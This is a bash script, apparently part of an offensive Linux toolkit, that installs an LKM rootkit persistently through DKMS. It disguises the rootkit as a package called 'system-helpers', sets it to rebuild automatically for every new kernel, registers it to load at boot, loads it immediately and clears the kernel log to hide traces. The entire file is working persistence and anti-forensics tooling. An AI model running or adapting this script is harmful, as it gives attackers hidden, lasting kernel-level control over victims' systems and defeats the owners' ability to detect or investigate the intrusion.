#!/bin/bash

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

echo " [*] DKMS Integration for LKM Rootkit [*] "
echo ""

# Check if dkms is installed
if ! command -v dkms &>/dev/null; then
    echo "[*] Installing dkms..."
    apt-get install -y dkms 2>/dev/null || yum install -y dkms 2>/dev/null || {
        echo "[ERROR] Failed to install dkms. Install it manually." >&2
        exit 1
    }
fi

# Check for kernel headers
if [ ! -d "/lib/modules/$(uname -r)/build" ]; then
    echo "[*] Installing kernel headers..."
    apt-get install -y linux-headers-$(uname -r) 2>/dev/null || yum install -y kernel-devel-$(uname -r) 2>/dev/null
fi

read -p "Enter the full path to the rootkit source directory (e.g. /root/D3m0n1z3dShell/locutus): " src_dir

if [ ! -d "$src_dir" ]; then
    echo "[ERROR] Source directory not found at $src_dir" >&2
    exit 1
fi

# Try to detect module name from Makefile
modname=""
if [ -f "$src_dir/Makefile" ]; then
    modname=$(grep -oP 'obj-m\+?=\s*\K[^.]+' "$src_dir/Makefile" 2>/dev/null | head -1)
fi
if [ -z "$modname" ]; then
    read -p "Enter the kernel module name (without .ko): " modname
fi

read -p "Enter a version string (default: 1.0): " modver
modver="${modver:-1.0}"

# Disguise name for the DKMS package
read -p "Enter a disguise package name (default: system-helpers): " pkg_name
pkg_name="${pkg_name:-system-helpers}"

DKMS_DIR="/usr/src/${pkg_name}-${modver}"

echo "[+] Setting up DKMS source tree at $DKMS_DIR"
mkdir -p "$DKMS_DIR"

# Copy all source files
cp "$src_dir"/*.c "$DKMS_DIR/" 2>/dev/null
cp "$src_dir"/*.h "$DKMS_DIR/" 2>/dev/null

# Create DKMS-compatible Makefile
cat > "$DKMS_DIR/Makefile" <<MKEOF
obj-m += ${modname}.o

all:
	make -C /lib/modules/\$(shell uname -r)/build/ M=\$(PWD) modules
clean:
	make -C /lib/modules/\$(shell uname -r)/build/ M=\$(PWD) clean
MKEOF

# Create dkms.conf
cat > "$DKMS_DIR/dkms.conf" <<DKMSEOF
PACKAGE_NAME="${pkg_name}"
PACKAGE_VERSION="${modver}"
BUILT_MODULE_NAME[0]="${modname}"
DEST_MODULE_LOCATION[0]="/kernel/lib/"
AUTOINSTALL="yes"
MAKE[0]="make -C /lib/modules/\${kernelver}/build M=\${dkms_tree}/\${PACKAGE_NAME}/\${PACKAGE_VERSION}/build modules"
CLEAN="make -C /lib/modules/\${kernelver}/build M=\${dkms_tree}/\${PACKAGE_NAME}/\${PACKAGE_VERSION}/build clean"
DKMSEOF

echo "[+] Adding module to DKMS tree..."
dkms add -m "$pkg_name" -v "$modver" 2>/dev/null

echo "[+] Building module via DKMS..."
dkms build -m "$pkg_name" -v "$modver"
if [ $? -ne 0 ]; then
    echo "[ERROR] DKMS build failed. Check source code and kernel headers." >&2
    exit 1
fi

echo "[+] Installing module via DKMS..."
dkms install -m "$pkg_name" -v "$modver"
if [ $? -ne 0 ]; then
    echo "[ERROR] DKMS install failed." >&2
    exit 1
fi

# Ensure it loads on boot
grep -qxF "$modname" /etc/modules 2>/dev/null || echo "$modname" >> /etc/modules
mkdir -p /etc/modules-load.d/
echo "$modname" > /etc/modules-load.d/${modname}.conf

# Load it now if not already loaded
if ! lsmod | grep -q "^${modname} " 2>/dev/null; then
    modprobe "$modname" 2>/dev/null || insmod "/lib/modules/$(uname -r)/kernel/lib/${modname}.ko" 2>/dev/null
fi

# Clean traces
dmesg -C 2>/dev/null

clear

echo "[*] Success!! DKMS integration complete for module: $modname [*]"
echo "    DKMS package: $pkg_name v$modver"
echo "    Source tree:   $DKMS_DIR"
echo "    The module will auto-recompile and install for every new kernel."
echo "    Verify with: dkms status"

sleep 2

clear
